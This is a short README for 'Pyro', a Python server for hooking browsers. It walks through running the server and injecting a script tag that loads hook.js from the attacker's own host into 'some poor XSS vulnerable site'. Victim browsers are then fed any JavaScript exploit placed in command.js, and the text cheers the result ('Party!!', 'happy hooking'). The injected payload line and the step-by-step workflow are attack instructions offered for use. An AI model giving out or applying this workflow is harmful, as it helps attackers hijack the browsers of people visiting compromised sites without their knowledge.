Pyro -- A simple browser hooking server in python

Pyro was designed to be the simplest possible hooking server
to serve as a demonstation and a starting point for more serious
developement.

To start using Pyro you require no external packages! Most modern
python installations should work fine!

To run:
	./SimpleServer.py
	
You may want to edit the 'command.js' as it will not work until it has
a different md5 hash from when the server started.
So 

Step 1)

	./SimpleServer.py
	
Step 2)

	inject '<script src='http://yourserver.domain:port/hook.js'></script>
	
into some poor XSS vulnerable site, and have it run in a browser

Step 3)

while the client asks for commands

	edit command.js with your favourite js exploit
	
Step 4)

	Party!!
	

Make sure that the hook.js and command.js is in the same path as Pyro.py
and if you'd like to use the hooktest.js make sure to place it there too.

Enjoy! and happy hooking!
k3170makan
